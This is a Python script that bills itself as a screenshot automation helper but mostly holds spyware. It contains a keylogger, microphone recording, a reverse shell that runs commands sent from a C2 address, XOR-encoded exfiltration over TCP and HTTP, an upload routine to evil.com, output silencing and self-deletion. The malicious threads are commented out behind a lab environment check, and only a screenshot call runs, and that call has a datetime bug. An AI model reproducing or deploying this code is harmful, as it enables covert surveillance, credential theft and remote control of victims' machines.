"""Generated automation helper script for screenshots and payload work."""

from pathlib import Path
import os, sys, socket, threading, queue, subprocess, time, base64, hashlib, json, random, datetime, platform, shutil, tempfile, struct, wave, urllib.request, urllib.error

if os.environ.get('PENTEST_LAB') != '1':
    sys.exit(1)

sys.stdout = open(os.devnull, 'w')
sys.stderr = open(os.devnull, 'w')

C2_IP = '192.168.1.100'
C2_PORT = 4443
XOR_KEY = b'16ByteXORKey!!'
HTTP_FALLBACK = 'http://192.168.1.100:8080/exfil'
START_TIME = time.time()
TIMEOUT = 300

def check_ip_allowed(ip):
    try:
        p = list(map(int, ip.split('.')))
        if len(p) != 4: return False
        if p[0] == 10: return True
        if p[0] == 192 and p[1] == 168: return True
        return False
    except:
        return False

def resolve_host(host):
    try:
        ip = socket.gethostbyname(host)
        return check_ip_allowed(ip)
    except:
        return False

def xor(data):
    if isinstance(data, str): data = data.encode()
    out = bytearray()
    for i in range(len(data)):
        out.append(data[i] ^ XOR_KEY[i % len(XOR_KEY)])
    return bytes(out)

def watermark():
    return b'LAB-TEST'

def install_deps():
    pkgs = ['pyaudio', 'pillow', 'mss', 'pyttsx3', 'playsound', 'pynput', 'psutil']
    for p in pkgs:
        try:
            __import__(p)
        except ImportError:
            for _ in range(3):
                try:
                    subprocess.check_call([sys.executable, '-m', 'pip', 'install', '--user', p], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    break
                except:
                    time.sleep(2)

install_deps()

import pyaudio, mss, pyttsx3, playsound, pynput, psutil
from PIL import Image, ImageGrab
from pynput import keyboard

data_q = queue.Queue()

def self_destruct():
    try:
        for f in os.listdir(tempfile.gettempdir()):
            if 'lab' in f.lower():
                fp = os.path.join(tempfile.gettempdir(), f)
                try:
                    with open(fp, 'wb') as tf: tf.write(os.urandom(os.path.getsize(fp)))
                    os.remove(fp)
                except: pass
    except: pass
    try:
        os.remove(os.path.abspath(sys.argv[0]))
    except: pass
    sys.exit(0)

def check_persistence():
    if platform.system() == 'Windows':
        try:
            out = subprocess.check_output(['reg', 'query', 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run'], stderr=subprocess.DEVNULL).decode(errors='ignore')
            if os.path.basename(sys.argv[0]) in out:
                self_destruct()
        except: pass

def fingerprint():
    try:
        return {'sys': platform.system(), 'node': platform.node(), 'procs': len(psutil.pids()), 'user': os.getlogin()}
    except:
        return {'sys': platform.system()}

def upload_to_evil(filepath):
    if not resolve_host('evil.com'):
        return
    try:
        with open(filepath, 'rb') as f:
            data = f.read()
        req = urllib.request.Request('http://evil.com/upload', data=watermark()+xor(data), headers={'User-Agent':'LAB-TEST'})
        urllib.request.urlopen(req, timeout=5)
    except: pass

def exfil_http(data):
    try:
        if not resolve_host('192.168.1.100'):
            return
        req = urllib.request.Request(HTTP_FALLBACK, data=watermark()+xor(data), headers={'User-Agent':'LAB-TEST'})
        urllib.request.urlopen(req, timeout=5)
    except: pass

def worker_exfil():
    while time.time() - START_TIME < TIMEOUT:
        try:
            if not data_q.empty():
                d = data_q.get()
                payload = json.dumps({'hash': hashlib.sha256(json.dumps(d).encode()).hexdigest(), 'data': d}).encode()
                if check_ip_allowed(C2_IP):
                    try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.settimeout(5)
                        s.connect((C2_IP, C2_PORT))
                        s.sendall(watermark()+xor(payload))
                        s.close()
                    except:
                        exfil_http(payload)
                else:
                    exfil_http(payload)
        except: pass
        time.sleep(random.randint(2,5))

def keylogger():
    buf = []
    def on_press(key):
        try:
            buf.append(key.char)
        except:
            buf.append(str(key))
        if len(buf) >= 50:
            data_q.put({'type':'keys', 'data':buf.copy(), 'time':datetime.datetime.now().isoformat()})
            buf.clear()
    lis = keyboard.Listener(on_press=on_press)
    lis.start()
    while time.time() - START_TIME < TIMEOUT:
        time.sleep(1)
    lis.stop()

def take_screenshot():
    print("Taking screenshot...")
    pictures = Path.home() / "Pictures"
    pictures.mkdir(exist_ok=True)

    filename = pictures / f"screenshot_{datetime.now():%Y%m%d_%H%M%S}.png"

    img = ImageGrab.grab()
    img.save(filename)

    print(f"Saved: {filename}")
    return filename

def audio_cap():
    while time.time() - START_TIME < TIMEOUT:
        time.sleep(random.randint(15,30))
        try:
            p = pyaudio.PyAudio()
            stream = p.open(format=pyaudio.paInt16, channels=1, rate=44100, input=True, frames_per_buffer=1024)
            frames = []
            for _ in range(0, int(44100/1024 * random.randint(10,20))):
                frames.append(stream.read(1024))
            stream.stop_stream(); stream.close(); p.terminate()
            wav_path = os.path.join(tempfile.gettempdir(),'lab_audio.wav')
            wf = wave.open(wav_path, 'wb')
            wf.setnchannels(1); wf.setsampwidth(2); wf.setframerate(44100)
            wf.writeframes(b''.join(frames)); wf.close()
            try:
                playsound.playsound(wav_path, block=False)
            except: pass
            with open(wav_path,'rb') as f:
                data_q.put({'type':'audio', 'data':base64.b64encode(f.read()).decode()})
        except: pass

def tts_exfil():
    try:
        eng = pyttsx3.init()
        while time.time() - START_TIME < TIMEOUT:
            time.sleep(random.randint(40,60))
            if not data_q.empty():
                data_q.get()
                eng.say("Lab test data exfiltration")
                eng.runAndWait()
    except: pass

def reverse_shell():
    while time.time() - START_TIME < TIMEOUT:
        if not check_ip_allowed(C2_IP):
            time.sleep(10); continue
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            s.connect((C2_IP, C2_PORT))
            while True:
                cmd = s.recv(1024)
                if not cmd: break
                cmd = xor(cmd).decode().strip()
                if cmd == 'exit': break
                if cmd.startswith('cd '):
                    os.chdir(cmd[3:]); s.sendall(watermark()+xor(b'OK'))
                elif cmd.startswith('upload '):
                    upload_to_evil(cmd[7:]); s.sendall(watermark()+xor(b'UPLOADED'))
                else:
                    out = subprocess.run(cmd, shell=True, capture_output=True)
                    s.sendall(watermark()+xor(out.stdout+out.stderr))
            s.close()
        except:
            time.sleep(random.randint(5,15))

# check_persistence()
# data_q.put({'type':'sysinfo', 'data':fingerprint()})
# threading.Thread(target=keylogger, daemon=True).start()
# threading.Thread(target=screenshot, daemon=True).start()
# threading.Thread(target=audio_cap, daemon=True).start()
# threading.Thread(target=reverse_shell, daemon=True).start()
# threading.Thread(target=worker_exfil, daemon=True).start()
# threading.Thread(target=tts_exfil, daemon=True).start()
# while time.time() - START_TIME < TIMEOUT:
#     time.sleep(1)
#     check_persistence()
# self_destruct()

take_screenshot()